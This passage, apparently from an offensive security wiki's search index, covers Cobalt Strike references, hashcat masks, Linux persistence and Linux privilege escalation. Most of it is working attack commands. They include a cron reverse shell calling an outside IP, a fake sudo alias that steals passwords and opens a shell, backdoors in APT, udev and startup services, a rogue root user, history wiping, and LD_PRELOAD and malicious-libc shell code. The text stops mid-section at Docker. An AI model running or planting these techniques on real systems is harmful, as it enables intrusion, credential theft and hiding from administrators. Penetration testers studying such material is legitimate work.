Vest - Sep 5, 2018 Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019 TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018 Cobalt Strike - DNS Beacon How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017 NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse Cobalt Strike - User Guide Cobalt Strike 4.6 - User Guide PDF "},{"id":19,"href":"/docs/hash_cracking/","title":"Hash Cracking Cheatsheet","section":"Docs","content":" Hash Cracking # Hashcat # Hashcat Install # apt install cmake build-essential -y apt install checkinstall git -y git clone https://github.com/hashcat/hashcat.git \u0026amp;\u0026amp; cd hashcat \u0026amp;\u0026amp; make -j 8 \u0026amp;\u0026amp; make install Extract the hash Get the hash format: https://hashcat.net/wiki/doku.php?id=example_hashes Establish a cracking stratgy based on hash format (ex: wordlist -\u0026gt; wordlist + rules -\u0026gt; mask -\u0026gt; combinator mode -\u0026gt; prince attack -\u0026gt; \u0026hellip;) Enjoy plains Review strategy Start over Dictionary # Every word of a given list (a.k.a. dictionary) is hashed and compared against the target hash.\nhashcat --attack-mode 0 --hash-type $number $hashes_file $wordlist_file -r $my_rules Wordlists\npacketstorm weakpass_3a weakpass_3 Hashes.org kerberoast_pws hashmob.net clem9669/wordlists Rules\nOne Rule to Rule Them All nsa-rules hob064 d3adhob0 clem9669/hashcat-rule Mask attack # Mask attack is an attack mode which optimize brute-force.\nEvery possibility for a given character set and a given length (i.e. aaa, aab, aac, \u0026hellip;) is hashed and compared against the target hash.\n# Mask: upper*1+lower*5+digit*2 and upper*1+lower*6+digit*2 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \u0026#34;*+!??\u0026#34; ?u?l?l?l?l?l?d?d?1 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \u0026#34;*+!??\u0026#34; ?u?l?l?l?l?l?l?d?d?1 # Mask: upper*1+lower*3+digit*4 and upper*1+lower*3+digit*4 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?d?d?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?d?d?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \u0026#34;*+!??\u0026#34; ?u?l?l?l?d?d?d?d?1 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \u0026#34;*+!??\u0026#34; ?u?l?l?l?l?d?d?d?d?1 # Mask: lower*6 + digit*2 + special digit(+!?*) hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \u0026#34;*+!??\u0026#34; ?l?l?l?l?l?l?d?d?1 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \u0026#34;*+!??\u0026#34; ?l?l?l?l?l?l?d?d?1?1 # Mask: lower*6 + digit*2 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 /content/hashcat/masks/8char-1l-1u-1d-1s-compliant.hcmask hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 ?l?d?u ?1?1?1?1?1?1?1?1 # Other examples hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a?a hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d?d?d hashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file \u0026#34;?a?a?a?a?a?a?a?a?a?a?a?a\u0026#34; hashcat --attack-mode 3 --hash-type $number $hashes_file \u0026#34;?u?l?l?l?d?d?d?d?s\u0026#34; hashcat --attack-mode 3 --hash-type $number $hashes_file \u0026#34;?a?a?a?a?a?a?a?a\u0026#34; hashcat --attack-mode 3 --custom-charset1 \u0026#34;?u\u0026#34; --custom-charset2 \u0026#34;?l?u?d\u0026#34; --custom-charset3 \u0026#34;?d\u0026#34; --hash-type $number $hashes_file \u0026#34;?1?2?2?2?3\u0026#34; Shortcut Characters ?l abcdefghijklmnopqrstuvwxyz ?u ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d 0123456789 ?s !\u0026quot;#$%\u0026amp;\u0026rsquo;()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`{}~ ?a ?l?u?d?s ?b 0x00 - 0xff John # John Usage # # Run on password file containing hashes to be cracked john passwd # Use a specific wordlist john --wordlist=\u0026lt;wordlist\u0026gt; passwd # Use a specific wordlist with rules john --wordlist=\u0026lt;wordlist\u0026gt; passwd --rules=Jumbo # Show cracked passwords john --show passwd # Restore interrupted sessions john --restore Rainbow tables # The hash is looked for in a pre-computed table. It is a time-memory trade-off that allows cracking hashes faster, but costing a greater amount of memory than traditional brute-force of dictionary attacks. This attack cannot work if the hashed value is salted (i.e. hashed with an additional random value as prefix/suffix, making the pre-computed table irrelevant)\nTips and Tricks # Cloud GPU penglab - Abuse of Google Colab for cracking hashes. 🐧 google-colab-hashcat - Google colab hash cracking Cloudtopolis - Zero Infrastructure Password Cracking Nephelees - also a NTDS cracking tool abusing Google Colab Build a rig on premise Pentester\u0026rsquo;s Portable Cracking Rig - $1000 How To Build A Password Cracking Rig - 5000$ Online cracking Hashes.com hashmob.net: great community with Discord Use the loopback in combination with rules and dictionary to keep cracking until you don\u0026rsquo;t find new passsword: hashcat --loopback --attack-mode 0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file Online Cracking Resources # hashes.com crackstation Hashmob References # Cracking - The Hacker Recipes Using Hashcat to Crack Hashes on Azure miloserdov.org hashcat miloserdov.org john "},{"id":20,"href":"/docs/linux_persistence/","title":"Linux - Persistence","section":"Docs","content":" Linux - Persistence # Basic reverse shell # ncat --udp -lvp 4242 ncat --sctp -lvp 4242 ncat --tcp -lvp 4242 Add a root user # sudo useradd -ou 0 -g 0 john sudo passwd john echo \u0026#34;linuxpassword\u0026#34; | passwd --stdin john Suid Binary # TMPDIR2=\u0026#34;/var/tmp\u0026#34; echo \u0026#39;int main(void){setresuid(0, 0, 0);system(\u0026#34;/bin/sh\u0026#34;);}\u0026#39; \u0026gt; $TMPDIR2/croissant.c gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2\u0026gt;/dev/null rm $TMPDIR2/croissant.c chown root:root $TMPDIR2/croissant chmod 4777 $TMPDIR2/croissant Crontab - Reverse shell # (crontab -l ; echo \u0026#34;@reboot sleep 200 \u0026amp;\u0026amp; ncat 192.168.1.2 4242 -e /bin/bash\u0026#34;)|crontab 2\u0026gt; /dev/null Backdooring a user\u0026rsquo;s bash_rc # (FR/EN Version)\nTMPNAME2=\u0026#34;.systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0\u0026#34; cat \u0026lt;\u0026lt; EOF \u0026gt; /tmp/$TMPNAME2 alias sudo=\u0026#39;locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \\$locale = \u0026#34;en\u0026#34; ]; then echo -n \u0026#34;[sudo] password for \\$USER: \u0026#34;;fi;if [ \\$locale = \u0026#34;fr\u0026#34; ]; then echo -n \u0026#34;[sudo] Mot de passe de \\$USER: \u0026#34;;fi;read -s pwd;echo; unalias sudo; echo \u0026#34;\\$pwd\u0026#34; | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash \u0026gt; /dev/null \u0026amp;\u0026amp; /usr/bin/sudo -S \u0026#39; EOF if [ -f ~/.bashrc ]; then cat /tmp/$TMPNAME2 \u0026gt;\u0026gt; ~/.bashrc fi if [ -f ~/.zshrc ]; then cat /tmp/$TMPNAME2 \u0026gt;\u0026gt; ~/.zshrc fi rm /tmp/$TMPNAME2 or add the following line inside its .bashrc file.\n$ chmod u+x ~/.hidden/fakesudo $ echo \u0026#34;alias sudo=~/.hidden/fakesudo\u0026#34; \u0026gt;\u0026gt; ~/.bashrc and create the fakesudo script.\nread -sp \u0026#34;[sudo] password for $USER: \u0026#34; sudopass echo \u0026#34;\u0026#34; sleep 2 echo \u0026#34;Sorry, try again.\u0026#34; echo $sudopass \u0026gt;\u0026gt; /tmp/pass.txt /usr/bin/sudo $@ Backdooring a startup service # RSHELL=\u0026#34;ncat $LMTHD $LHOST $LPORT -e \\\u0026#34;/bin/bash -c id;/bin/bash\\\u0026#34; 2\u0026gt;/dev/null\u0026#34; sed -i -e \u0026#34;4i \\$RSHELL\u0026#34; /etc/network/if-up.d/upstart Backdooring a user startup file # Linux, write a file in ~/.config/autostart/NAME_OF_FILE.desktop\nIn : ~/.config/autostart/*.desktop [Desktop Entry] Type=Application Name=Welcome Exec=/var/lib/gnome-welcome-tour AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide OnlyShowIn=GNOME; X-GNOME-Autostart-enabled=false Backdooring a driver # echo \u0026#34;ACTION==\\\u0026#34;add\\\u0026#34;,ENV{DEVTYPE}==\\\u0026#34;usb_device\\\u0026#34;,SUBSYSTEM==\\\u0026#34;usb\\\u0026#34;,RUN+=\\\u0026#34;$RSHELL\\\u0026#34;\u0026#34; | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules \u0026gt; /dev/null Backdooring the APT # If you can create a file on the apt.conf.d directory with: APT::Update::Pre-Invoke {\u0026quot;CMD\u0026quot;}; Next time \u0026ldquo;apt-get update\u0026rdquo; is done, your CMD will be executed!\necho \u0026#39;APT::Update::Pre-Invoke {\u0026#34;nohup ncat -lvp 1234 -e /bin/bash 2\u0026gt; /dev/null \u0026amp;\u0026#34;};\u0026#39; \u0026gt; /etc/apt/apt.conf.d/42backdoor Backdooring the SSH # Add an ssh key into the ~/.ssh folder.\nssh-keygen write the content of ~/.ssh/id_rsa.pub into ~/.ssh/authorized_keys set the right permission, 700 for ~/.ssh and 600 for authorized_keys Tips # Hide the payload with ANSI chars, the following chars will clear the terminal when using cat to display the content of your payload.\n#\u001b[2J\u001b[2J\u001b[2J\u001b[2H\u001b[2A# Do not remove. Generated from /etc/issue.conf by configure. Hide in plain sight using zero width spaces in filename.\ntouch $(echo -n \u0026#39;index\\u200D.php\u0026#39;) index.php Clear the last line of the history.\nhistory -d $(history | tail -2 | awk \u0026#39;{print $1}\u0026#39;) 2\u0026gt; /dev/null Clear history\n[SPACE] ANY COMMAND or export HISTSIZE=0 export HISTFILESIZE=0 unset HISTFILE; CTRL-D or kill -9 $$ or echo \u0026#34;\u0026#34; \u0026gt; ~/.bash_history or rm ~/.bash_history -rf or history -c or ln /dev/null ~/.bash_history -sf The following directories are temporary and usually writeable\n/var/tmp/ /tmp/ /dev/shm/ Additional Persistence Options # SSH Authorized Keys Compromise Client Software Binary Create Account Create Account: Local Account Create or Modify System Process Create or Modify System Process: Systemd Service Event Triggered Execution: Trap Event Triggered Execution Event Triggered Execution: .bash_profile and .bashrc External Remote Services Hijack Execution Flow Hijack Execution Flow: LD_PRELOAD Pre-OS Boot Pre-OS Boot: Bootkit Scheduled Task/Job Scheduled Task/Job: At (Linux) Scheduled Task/Job: Cron Server Software Component Server Software Component: SQL Stored Procedures Server Software Component: Transport Agent Server Software Component: Web Shell Traffic Signaling Traffic Signaling: Port Knocking Valid Accounts: Default Accounts Valid Accounts: Domain Accounts 2 References # @RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289 https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/ http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/ Pouki from JDI "},{"id":21,"href":"/docs/linux_privilege_escalation/","title":"Linux - Privilege Escalation","section":"Docs","content":" Linux - Privilege Escalation # Tools # There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors. Here are a few:\nLinPEAS - Linux Privilege Escalation Awesome Script\nwget \u0026#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\u0026#34; -O linpeas.sh curl \u0026#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\u0026#34; -o linpeas.sh ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete. ./linpeas.sh -s #superfast \u0026amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk. ./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users Traitor - Linux Privielege Escalation\nAutomatically exploit low-hanging fruit to pop a root shell. Linux privilege escalation made easy! Traitor packages up a bunch of methods to exploit local misconfigurations and vulnerabilities in order to pop a root shell: Nearly all of GTFOBins Writeable docker.sock CVE-2022-0847 (Dirty pipe) CVE-2021-4034 (pwnkit) CVE-2021-3560 LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs\nwget \u0026#34;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\u0026#34; -O lse.sh curl \u0026#34;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\u0026#34; -o lse.sh ./lse.sh -l1 # shows interesting information that should help you to privesc ./lse.sh -l2 # dump all the information it gathers about the system LinEnum - Scripted Local Linux Enumeration \u0026amp; Privilege Escalation Checks\n./LinEnum.sh -s -k keyword -r report -e /tmp/ -t BeRoot - Privilege Escalation Project - Windows / Linux / Mac\nlinuxprivchecker.py - a Linux Privilege Escalation Check Script\nunix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check\nPrivilege Escalation through sudo - Linux\nChecklists # Kernel and distribution release details System Information: Hostname Networking details: Current IP Default route details DNS server information User Information: Current user details Last logged on users Shows users logged onto the host List all users including uid/gid information List root accounts Extracts password policies and hash storage method information Checks umask value Checks if password hashes are stored in /etc/passwd Extract full details for \u0026lsquo;default\u0026rsquo; uid\u0026rsquo;s such as 0, 1000, 1001 etc Attempt to read restricted files i.e. /etc/shadow List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.) Basic SSH checks Privileged access: Which users have recently used sudo Determine if /etc/sudoers is accessible Determine if the current user has Sudo access without a password Are known \u0026lsquo;good\u0026rsquo; breakout binaries available via Sudo (i.e. nmap, vim etc.) Is root\u0026rsquo;s home directory accessible List permissions for /home/ Environmental: Display current $PATH Displays env information Jobs/Tasks: List all cron jobs Locate all world-writable cron jobs Locate cron jobs owned by other users of the system List the active and inactive systemd timers Services: List network connections (TCP \u0026amp; UDP) List running processes Lookup and list process binaries and associated permissions List inetd.conf/xined.conf contents and associated binary file permissions List init.d binary permissions Version Information (of the following): Sudo MYSQL Postgres Apache Checks user config Shows enabled modules Checks for htpasswd files View www directories Default/Weak Credentials: Checks for default/weak Postgres accounts Checks for default/weak MYSQL accounts Searches: Locate all SUID/GUID files Locate all world-writable SUID/GUID files Locate all SUID/GUID files owned by root Locate \u0026lsquo;interesting\u0026rsquo; SUID/GUID files (i.e. nmap, vim etc) Locate files with POSIX capabilities List all world-writable files Find/list all accessible *.plan files and display contents Find/list all accessible *.rhosts files and display contents Show NFS server details Locate *.conf and *.log files containing keyword supplied at script runtime List all *.conf files located in /etc Locate mail Platform/software specific tests: Checks to determine if we\u0026rsquo;re in a Docker container Checks to see if the host has Docker installed Checks to determine if we\u0026rsquo;re in an LXC container Looting for passwords # Files containing passwords # grep --color=auto -rnw \u0026#39;/\u0026#39; -ie \u0026#34;PASSWORD\u0026#34; --color=always 2\u0026gt; /dev/null find . -type f -exec grep -i -I \u0026#34;PASSWORD\u0026#34; {} /dev/null \\; Old passwords in /etc/security/opasswd # The /etc/security/opasswd file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.\n:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes\nLast edited files # Files that were edited in the last 10 minutes\nfind / -mmin -10 2\u0026gt;/dev/null | grep -Ev \u0026#34;^/proc\u0026#34; In memory passwords # strings /dev/mem -n10 | grep -i PASS Find sensitive files # $ locate password | more /boot/grub/i386-pc/password.mod /etc/pam.d/common-password /etc/pam.d/gdm-password /etc/pam.d/gdm-password.original /lib/live/config/0031-root-password ... SSH Key # Sensitive files # find / -name authorized_keys 2\u0026gt; /dev/null find / -name id_rsa 2\u0026gt; /dev/null ... SSH Key Predictable PRNG (Authorized_Keys) Process # This module describes how to attempt to use an obtained authorized_keys file on a host system.\nNeeded : SSH-DSS String from authorized_keys file\nSteps\nGet the authorized_keys file. An example of this file would look like so: ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... Since this is an ssh-dss key, we need to add that to our local copy of /etc/ssh/ssh_config and /etc/ssh/sshd_config: echo \u0026#34;PubkeyAcceptedKeyTypes=+ssh-dss\u0026#34; \u0026gt;\u0026gt; /etc/ssh/ssh_config echo \u0026#34;PubkeyAcceptedKeyTypes=+ssh-dss\u0026#34; \u0026gt;\u0026gt; /etc/ssh/sshd_config /etc/init.d/ssh restart Get g0tmi1k\u0026rsquo;s debian-ssh repository and unpack the keys: git clone https://github.com/g0tmi1k/debian-ssh cd debian-ssh tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2 Grab the first 20 or 30 bytes from the key file shown above starting with the \u0026quot;AAAA...\u0026quot; portion and grep the unpacked keys with it as: grep -lr \u0026#39;AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf\u0026#39; dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the \u0026lsquo;.pub\u0026rsquo; extension and do: ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934 And you should connect without requiring a password. If stuck, the -vvv verbosity should provide enough details as to why.\nScheduled tasks # Cron jobs # Check if you have access with write permission on these files.\nCheck inside the file, to find other paths with write permissions.\n/etc/init.d /etc/cron* /etc/crontab /etc/cron.allow /etc/cron.d /etc/cron.deny /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly /etc/sudoers /etc/exports /etc/anacrontab /var/spool/cron /var/spool/cron/crontabs/root crontab -l ls -alh /var/spool/cron; ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny* You can use pspy to detect a CRON job.\n# print both commands and file system events and scan procfs every 1000 ms (=1sec) ./pspy64 -pf -i 1000 Systemd timers # systemctl list-timers --all NEXT LEFT LAST PASSED UNIT ACTIVATES Mon 2019-04-01 02:59:14 CEST 15h left Sun 2019-03-31 10:52:49 CEST 24min ago apt-daily.timer apt-daily.service Mon 2019-04-01 06:20:40 CEST 19h left Sun 2019-03-31 10:52:49 CEST 24min ago apt-daily-upgrade.timer apt-daily-upgrade.service Mon 2019-04-01 07:36:10 CEST 20h left Sat 2019-03-09 14:28:25 CET 3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service 3 timers listed. SUID # SUID/Setuid stands for \u0026ldquo;set user ID upon execution\u0026rdquo;, it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is root, the uid will be changed to root even if it was executed from user bob. SUID bit is represented by an s.\n╭─swissky@lab ~ ╰─$ ls /usr/bin/sudo -alh -rwsr-xr-x 1 root root 138K 23 nov. 16:04 /usr/bin/sudo Find SUID binaries # find / -perm -4000 -type f -exec ls -la {} 2\u0026gt;/dev/null \\; find / -uid 0 -perm -4000 -type f 2\u0026gt;/dev/null Create a SUID binary # Function Description setreuid() sets real and effective user IDs of the calling process setuid() sets the effective user ID of the calling process setgid() sets the effective group ID of the calling process print \u0026#39;int main(void){\\nsetresuid(0, 0, 0);\\nsystem(\u0026#34;/bin/sh\u0026#34;);\\n}\u0026#39; \u0026gt; /tmp/suid.c gcc -o /tmp/suid /tmp/suid.c sudo chmod +x /tmp/suid # execute right sudo chmod +s /tmp/suid # setuid bit Capabilities # List capabilities of binaries # ╭─swissky@lab ~ ╰─$ /usr/bin/getcap -r /usr/bin /usr/bin/fping = cap_net_raw+ep /usr/bin/dumpcap = cap_dac_override,cap_net_admin,cap_net_raw+eip /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep /usr/bin/rlogin = cap_net_bind_service+ep /usr/bin/ping = cap_net_raw+ep /usr/bin/rsh = cap_net_bind_service+ep /usr/bin/rcp = cap_net_bind_service+ep Edit capabilities # /usr/bin/setcap -r /bin/ping # remove /usr/bin/setcap cap_net_raw+p /bin/ping # add Interesting capabilities # Having the capability =ep means the binary has all the capabilities.\n$ getcap openssl /usr/bin/openssl openssl=ep Alternatively the following capabilities can be used in order to upgrade your current privileges.\ncap_dac_read_search # read anything cap_setuid+ep # setuid Example of privilege escalation with cap_setuid+ep\n$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7 $ python2.7 -c \u0026#39;import os; os.setuid(0); os.system(\u0026#34;/bin/sh\u0026#34;)\u0026#39; sh-5.0# id uid=0(root) gid=1000(swissky) Capabilities name Description CAP_AUDIT_CONTROL Allow to enable/disable kernel auditing CAP_AUDIT_WRITE Helps to write records to kernel auditing log CAP_BLOCK_SUSPEND This feature can block system suspends CAP_CHOWN Allow user to make arbitrary change to files UIDs and GIDs CAP_DAC_OVERRIDE This helps to bypass file read, write and execute permission checks CAP_DAC_READ_SEARCH This only bypass file and directory read/execute permission checks CAP_FOWNER This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file CAP_KILL Allow the sending of signals to processes belonging to others CAP_SETGID Allow changing of the GID CAP_SETUID Allow changing of the UID CAP_SETPCAP Helps to transferring and removal of current set to any PID CAP_IPC_LOCK This helps to lock memory CAP_MAC_ADMIN Allow MAC configuration or state changes CAP_NET_RAW Use RAW and PACKET sockets CAP_NET_BIND_SERVICE SERVICE Bind a socket to internet domain privileged ports SUDO # Tool: Sudo Exploitation\nNOPASSWD # Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.\n$ sudo -l User demo may run the following commands on crashlab: (root) NOPASSWD: /usr/bin/vim In this example the user demo can run vim as root, it is now trivial to get a shell by adding an ssh key into the root directory or by calling sh.\nsudo vim -c \u0026#39;!sh\u0026#39; sudo -u root vim -c \u0026#39;!sh\u0026#39; LD_PRELOAD and NOPASSWD # If LD_PRELOAD is explicitly defined in the sudoers file\nDefaults env_keep += LD_PRELOAD Compile the following shared object using the C code below with gcc -fPIC -shared -o shell.so shell.c -nostartfiles\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void _init() { unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); setgid(0); setuid(0); system(\u0026#34;/bin/sh\u0026#34;); } Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=\u0026lt;full_path_to_so_file\u0026gt; \u0026lt;program\u0026gt;, e.g: sudo LD_PRELOAD=/tmp/shell.so find\nDoas # There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf\npermit nopass demo as root cmd vim sudo_inject # Using https://github.com/nongiach/sudo_inject\n$ sudo whatever [sudo] password for user: # Press \u0026lt;ctrl\u0026gt;+c since you don\u0026#39;t have the password. # This creates an invalid sudo tokens. $ sh exploit.sh .... wait 1 seconds $ sudo -i # no password required :) # id uid=0(root) gid=0(root) groups=0(root) Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf\nCVE-2019-14287 # # Exploitable when a user have the following permissions (sudo -l) (ALL, !root) ALL # If you have a full TTY, you can exploit it like this sudo -u#-1 /bin/bash sudo -u#4294967295 id GTFOBins # GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.\nThe project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.\ngdb -nx -ex \u0026lsquo;!sh\u0026rsquo; -ex quit sudo mysql -e \u0026lsquo;! /bin/sh\u0026rsquo; strace -o /dev/null /bin/sh sudo awk \u0026lsquo;BEGIN {system(\u0026quot;/bin/sh\u0026quot;)}\u0026rsquo;\nWildcard # By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that\u0026rsquo;s where the wildcard comes in handy.\n# create file for exploitation touch -- \u0026#34;--checkpoint=1\u0026#34; touch -- \u0026#34;--checkpoint-action=exec=sh shell.sh\u0026#34; echo \u0026#34;#\\!/bin/bash\\ncat /etc/passwd \u0026gt; /tmp/flag\\nchmod 777 /tmp/flag\u0026#34; \u0026gt; shell.sh # vulnerable script tar cf archive.tar * Tool: wildpwn\nWritable files # List world writable files on the system.\nfind / -writable ! -user `whoami` -type f ! -path \u0026#34;/proc/*\u0026#34; ! -path \u0026#34;/sys/*\u0026#34; -exec ls -al {} \\; 2\u0026gt;/dev/null find / -perm -2 -type f 2\u0026gt;/dev/null find / ! -path \u0026#34;*/proc/*\u0026#34; -perm -2 -type f -print 2\u0026gt;/dev/null Writable /etc/sysconfig/network-scripts/ (Centos/Redhat) # /etc/sysconfig/network-scripts/ifcfg-1337 for example\nNAME=Network /bin/id \u0026amp;lt;= Note the blank space ONBOOT=yes DEVICE=eth0 EXEC : ./etc/sysconfig/network-scripts/ifcfg-1337 src : https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure\u0026amp;qid=e026a0c5f83df4fd532442e1324ffa4f\nWritable /etc/passwd # First generate a password with one of the following commands.\nopenssl passwd -1 -salt hacker hacker mkpasswd -m SHA-512 hacker python2 -c \u0026#39;import crypt; print crypt.crypt(\u0026#34;hacker\u0026#34;, \u0026#34;$6$salt\u0026#34;)\u0026#39; Then add the user hacker and add the generated password.\nhacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash E.g: hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash\nYou can now use the su command with hacker:hacker\nAlternatively you can use the following lines to add a dummy user without a password. WARNING: you might degrade the current security of the machine.\necho \u0026#39;dummy::0:0::/root:/bin/bash\u0026#39; \u0026gt;\u0026gt;/etc/passwd su - dummy NOTE: In BSD platforms /etc/passwd is located at /etc/pwd.db and /etc/master.passwd, also the /etc/shadow is renamed to /etc/spwd.db.\nWritable /etc/sudoers # echo \u0026#34;username ALL=(ALL:ALL) ALL\u0026#34;\u0026gt;\u0026gt;/etc/sudoers # use SUDO without password echo \u0026#34;username ALL=(ALL) NOPASSWD: ALL\u0026#34; \u0026gt;\u0026gt;/etc/sudoers echo \u0026#34;username ALL=NOPASSWD: /bin/bash\u0026#34; \u0026gt;\u0026gt;/etc/sudoers NFS Root Squashing # When no_root_squash appears in /etc/exports, the folder is shareable and a remote user can mount it.\n# remote check the name of the folder showmount -e 10.10.10.10 # create dir mkdir /tmp/nfsdir # mount directory mount -t nfs 10.10.10.10:/shared /tmp/nfsdir cd /tmp/nfsdir # copy wanted shell cp /bin/bash . # set suid permission chmod +s bash Shared Library # ldconfig # Identify shared libraries with ldd\n$ ldd /opt/binary linux-vdso.so.1 (0x00007ffe961cd000) vulnlib.so.8 =\u0026gt; /usr/lib/vulnlib.so.8 (0x00007fa55e55a000) /lib64/ld-linux-x86-64.so.2 =\u0026gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000) Create a library in /tmp and activate the path.\ngcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c echo \u0026#34;/tmp/\u0026#34; \u0026gt; /etc/ld.so.conf.d/exploit.conf \u0026amp;\u0026amp; ldconfig -l /tmp/vulnlib.so /opt/binary RPATH # level15@nebula:/home/flag15$ readelf -d flag15 | egrep \u0026#34;NEEDED|RPATH\u0026#34; 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000f (RPATH) Library rpath: [/var/tmp/flag15] level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 =\u0026gt; (0x0068c000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x005bb000) By copying the lib into /var/tmp/flag15/ it will be used by the program in this place as specified in the RPATH variable.\nlevel15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/ level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 =\u0026gt; (0x005b0000) libc.so.6 =\u0026gt; /var/tmp/flag15/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x00737000) Then create an evil library in /var/tmp with gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6\n#include\u0026lt;stdlib.h\u0026gt; #define SHELL \u0026#34;/bin/sh\u0026#34; int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { char *file = SHELL; char *argv[] = {SHELL,0}; setresuid(geteuid(),geteuid(), geteuid()); execve(file,argv,0); } Groups # Docker # Mount the filesystem in a bash container, allowing you to 